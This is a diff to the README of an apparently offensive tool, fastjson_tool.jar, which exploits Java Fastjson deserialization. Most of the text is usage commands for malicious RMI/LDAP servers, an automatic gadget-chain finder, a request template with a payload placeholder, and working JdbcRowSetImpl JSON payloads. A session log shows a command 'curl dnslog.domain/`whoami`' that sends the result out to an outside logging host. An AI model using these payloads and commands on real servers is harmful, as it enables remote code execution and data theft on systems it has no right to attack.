@@ -5,9 +5,50 @@ java -jar fastjson_tool.jar
 Usage:
 java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
 java -cp fastjson_tool.jar fastjson.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"
-java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" el-win/el-linux/groovy 
+
+java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 filename
 java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099  CommonsCollections1 "curl dnslog.cn"
+
 java -cp fastjson_tool.jar fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" el-win/el-linux/groovy
+
+
+2020-10-30 新增：
+fastjson.LDAPRefServerAuto: 自动找寻反序列可利用的gadget(cb1,cc1-10,spring1-2,groovy1,jdk7u21)。
+java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 filename
+
+filename为请求包，需要插入fastjson攻击语句的地方，用__PAYLOAD__代替。示例：
+POST /fastjson_demo HTTP/1.1
+Host: xx.xx.xx.xx
+Connection: keep-alive
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.16 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Content-Type: application/json
+Content-Length: 165
+
+__PAYLOAD__
+
+
+> java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 8088 req
+
+[-] target: https://xx.xx.xx.xx/fastjson_demo
+[-] Payload list:
+0. {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}
+1. {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
+[-] please chosse payload, enter q or quit to quit
+> 1
+[-] url: https://xx.xx.xx.xx/fastjson_demo
+[-] post_data: {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
+[-] LDAP Listening on 127.0.0.1:8088
+[*] find: CommonsCollections10 can be use
+[-] please enter command, enter q or quit to quit
+> curl dnslog.domain/`whoami`
+[-] please enter command, enter q or quit to quit
+> q
+[-] quit
+
 
 
 [root@ /]# java -cp fastjson_tool.jar fastjson.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
